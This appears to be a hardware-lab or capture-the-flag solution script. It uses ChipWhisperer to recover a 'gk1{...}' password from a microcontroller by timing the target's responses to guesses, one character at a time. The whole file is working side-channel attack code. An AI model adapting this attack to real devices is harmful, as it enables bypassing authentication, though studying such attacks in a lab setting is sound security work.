import chipwhisperer as cw
import matplotlib.pyplot as plt
from string import ascii_lowercase, digits
import time


scope = cw.scope()
target = cw.target(scope, cw.targets.SimpleSerial)


def reset_target(scope):
    scope.io.nrst = 'low'
    time.sleep(0.05)
    scope.io.nrst = 'high_z'
    time.sleep(0.05)


def guess(password):
    start = time.perf_counter()
    target.simpleserial_write('a', password)
    response = target.simpleserial_read('r', 1)
    end = time.perf_counter()
    response = 0 if response == b"\x00" else 1
    timing = end - start
    return response, timing


def main():
    scope.default_setup()

    inside = b""

    for _ in range(8):
        timing = 0
        letter = ""

        prefix = b"gk1{"
        suffix = b"}"
        padding = (7 - len(inside)) * b"0"

        for tmp_letter in ascii_lowercase + digits:
            password = prefix + inside + tmp_letter.encode() + padding + suffix
            response, tmp_timing = guess(password)
            if tmp_timing > timing:
                timing = tmp_timing
                letter = tmp_letter

        inside += letter.encode()
    
    password = prefix + inside + suffix
    response, _ = guess(password)
    print(f"Got: {response} for Password: {password.decode()}")

    target.simpleserial_write('q', b"0")
    response = target.simpleserial_read('r', 4)
    if response is not None:
        print(f"Number of Queries (cumulative): {int.from_bytes(response, byteorder='little', signed=False)}") #number of queries since powerup


if __name__ == "__main__":
    main()
